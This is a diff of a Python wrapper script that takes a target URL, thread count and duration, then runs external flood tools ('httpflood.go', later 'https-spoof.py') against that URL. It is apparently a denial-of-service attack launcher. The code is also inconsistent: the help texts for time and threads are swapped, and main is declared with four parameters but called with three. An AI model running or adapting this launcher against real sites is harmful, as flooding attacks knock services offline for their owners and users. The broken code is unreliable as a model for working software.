@@ -66,11 +66,10 @@ def main(url, threads, time, methods):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
     parser.add_argument('url', type=str, help='URL to attack')
-    parser.add_argument('threads', type=str, help='Threads for attack')
-    parser.add_argument('methods', type=int, help='Time duration of attack')
-    parser.add_argument('time', type=str, help='Methods used')
+    parser.add_argument('time', type=str, help='Threads for attack')
+    parser.add_argument('threads', type=int, help='Time duration of attack')
 
     args = parser.parse_args()
 
-    os.system(f'go run httpflood.go {args.url} {args.threads} {args.methods} {args.time}')
-    main(args.url, args.threads, args.methods, args.time)
+    os.system(f'python3 https-spoof.py {args.url} {args.time} {args.threads}')
+    main(args.url, args.time, args.threads)
